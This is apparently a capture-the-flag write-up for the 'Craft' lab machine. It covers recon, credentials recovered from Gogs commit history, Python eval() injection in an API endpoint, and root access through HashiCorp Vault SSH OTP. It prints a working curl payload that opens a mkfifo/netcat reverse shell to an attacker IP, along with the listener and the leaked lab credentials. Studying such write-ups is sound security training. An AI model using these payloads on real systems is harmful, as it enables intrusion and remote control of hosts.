### Service Discovery Analysis

The Nmap scan reveals three key services running on the target machine:

- **SSH (Port 22):** OpenSSH 7.4p1 on Debian — standard SSH service
- **HTTPS (Port 443):** nginx 1.15.8 serving the craft.htb web application — SSL certificate is expired (2019-2020), suggesting an outdated environment
- **SSH (Port 6022):** Golang x/crypto/ssh server — this is not standard OpenSSH but a custom SSH implementation written in Go, typically associated with services like Gogs or Gitea

**OS:** Linux (Debian) **Domain:** craft.htb

Three things immediately stand out: the **expired SSL certificate** on port 443 suggests this is an older or unmaintained deployment, the **Golang SSH on port 6022** strongly suggests a Git hosting service like Gogs is running, and there is **no HTTP on port 80** — only HTTPS.

### Web Enumeration - Port 443

Accessing `https://craft.htb/` reveals the main web application. Examining the page source and navigation links, we discover two subdomains referenced:

- `https://api.craft.htb/api/` — the REST API for the Craft application
- `https://gogs.craft.htb/` — a Gogs Git hosting service

Both subdomains need to be added to `/etc/hosts` for resolution:

```bash
echo "<target> craft.htb api.craft.htb gogs.craft.htb" | sudo tee -a /etc/hosts
```

## **User**

### Overview - Gogs (Go Git Service)

**What is Gogs?** Gogs is a lightweight, open-source, self-hosted Git service written in Go. It functions similarly to GitHub or GitLab but is designed to be deployed internally within organizations. It provides repository hosting, issue tracking, wikis, and user management.

**Why is it relevant here?** Self-hosted Git services like Gogs are dangerous in CTF and real-world scenarios because developers often commit sensitive information — credentials, API keys, configuration files — directly to repositories. Even deleted commits can be recovered from the commit history, which is exactly what we exploit here.

### Gogs Repository Enumeration

Examining the commit history is critical — developers often accidentally commit credentials and then try to remove them with a follow-up commit, but the original commit remains in history.

![](/assets/img/craft/Pasted_image_20260917140204.png)

**Credentials found:** `dinesh:4aUh0A8PbVJxgd`

The commit also reveals the authentication endpoint: `https://api.craft.htb/api/auth/login`

### Overview - Python eval() Injection

**What is eval() Injection?** Python's `eval()` function executes a string as Python code. When user-supplied input is passed directly to `eval()` without sanitization, an attacker can inject arbitrary Python code that will be executed on the server. This is one of the most dangerous code injection vulnerabilities in Python applications.

**Why is it here?** Further inspection of the repository source code reveals that the `/brew` API endpoint passes the `abv` (alcohol by volume) field directly to `eval()` to validate that the value is between 0 and 1:

![](/assets/img/craft/Pasted_image_20260917141341.png)

Instead of validating the input as a number, the application blindly evaluates it as Python code — meaning we can pass any Python expression, including OS commands, and the server will execute them.

### Exploiting eval() - Python Code Injection (Reverse Shell)

The exploitation plan is:

1. Authenticate as dinesh to get a JWT token
2. Use the token to call the `/brew` endpoint
3. Inject a reverse shell payload into the `abv` field via `eval()`

First, set up a Netcat listener to catch the reverse shell:

```bash
nc -lvnp 4444
```

The following command authenticates as dinesh, extracts the JWT token from the response, then uses it to send a POST request to `/brew` with the malicious `abv` payload. The `__import__('os').system()` call abuses Python's built-in import mechanism to execute system commands, establishing a reverse shell via a named pipe:

```bash
TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H "accept: application/json" | cut -d '"' -f4)

curl -X POST "https://api.craft.htb/api/brew/" \
  -H "accept: application/json" \
  -H "Content-Type: application/json" \
  -d '{"id": 0,"brewer": "test","name": "beer","style": "bad","abv": "__import__('"'"'os'"'"').system('"'"'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 4444 >/tmp/f'"'"')"}' \
  -k -H "X-Craft-API-Token: $TOKEN"
```

![](/assets/img/craft/Pasted_image_20260917142205.png)

A reverse shell is caught by our Netcat listener. We are now running inside a Docker container as part of the Craft API service.

## **Root**

### HashiCorp Vault Discovery

Running `ls -la` in gilfoyle's home directory reveals hidden directories and configuration files:

![](/assets/img/craft/Pasted_image_20260917151501.png)

Returning to gilfoyle's Gogs profile, the `craft-infra` private repository contains a `vault` and in the craft-infra we found a `secret.sh` file. This reveals that gilfoyle has configured **HashiCorp Vault** to manage SSH logins on the system:

![](/assets/img/craft/Pasted_image_20260917160005.png)

The `secret.sh` script shows that a Vault role called `root_otp` has been created, allowing SSH login as root using a One-Time Password (OTP).

### Overview - HashiCorp Vault SSH OTP

**What is HashiCorp Vault?** HashiCorp Vault is an enterprise secrets management tool used to store, manage, and control access to tokens, passwords, certificates, API keys, and other secrets. It supports dynamic secret generation, including one-time SSH passwords.

**What is the SSH OTP mode?** Vault's SSH secrets engine can generate One-Time Passwords (OTPs) for SSH authentication. When configured, Vault generates a unique, time-limited password that can only be used once to authenticate to a specific host as a specific user. The `vault-ssh-helper` daemon running on the target verifies the OTP against the Vault server during login.

**Why is this exploitable here?** The `root_otp` role is configured to allow SSH as root to `127.0.0.1`. Since gilfoyle already has a valid Vault token (stored in their environment/configuration), they can request an OTP for the root role and SSH into localhost as root.

### Exploiting Vault SSH OTP

Since gilfoyle's environment is already authenticated to the Vault server (via the token discovered in their configuration), we can directly request an SSH OTP for the `root_otp` role.

The `vault ssh` command requests an OTP from Vault, then automatically uses it to SSH into the target. The `-mode=otp` flag specifies OTP authentication mode, `-role=root_otp` selects the preconfigured root role, and `root@127.0.0.1` connects as root on localhost:

```bash
vault ssh -mode=otp -role=root_otp root@127.0.0.1
```

Vault generates a One-Time Password and immediately uses it to authenticate the SSH connection. The SSH daemon on `127.0.0.1` verifies the OTP against the Vault server via `vault-ssh-helper`, granting access as root:

![](/assets/img/craft/Pasted_image_20260917163148.png)

Full root access is achieved. The root flag can now be retrieved.

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified HTTPS on port 443 and a Golang SSH service on port 6022; web enumeration revealed two subdomains — api.craft.htb and gogs.craft.htb
2. **Gogs Commit History:** Explored the public Craft repository on Gogs and found hardcoded credentials (dinesh:4aUh0A8PbVJxgd) in a commit
3. **Source Code Review:** Discovered that the `/brew` API endpoint passes the `abv` field directly to Python's `eval()` without sanitization
4. **eval() Exploitation:** Authenticated as dinesh to obtain a JWT token, then injected a Python reverse shell payload into the `abv` field to gain code execution inside a Docker container
5. **Database Enumeration:** Found MySQL credentials in the container, modified `dbtest.py` to dump all users from the database, extracting credentials for dinesh, ebachman, and gilfoyle
6. **Gogs Private Repository:** Used gilfoyle's credentials to access a private `craft-infra` repository containing a private SSH key
7. **SSH Access:** Used the discovered id_rsa key to authenticate as gilfoyle via SSH on port 22 and retrieved the user flag
8. **Vault Discovery:** Found HashiCorp Vault SSH OTP configuration in gilfoyle's private Gogs repository; identified a `root_otp` role configured to allow SSH as root
9. **Vault OTP Exploitation:** Used gilfoyle's pre-authenticated Vault token to request an OTP and SSH into localhost as root
10. **Full Compromise:** Achieved root access via Vault SSH OTP and retrieved the root flag
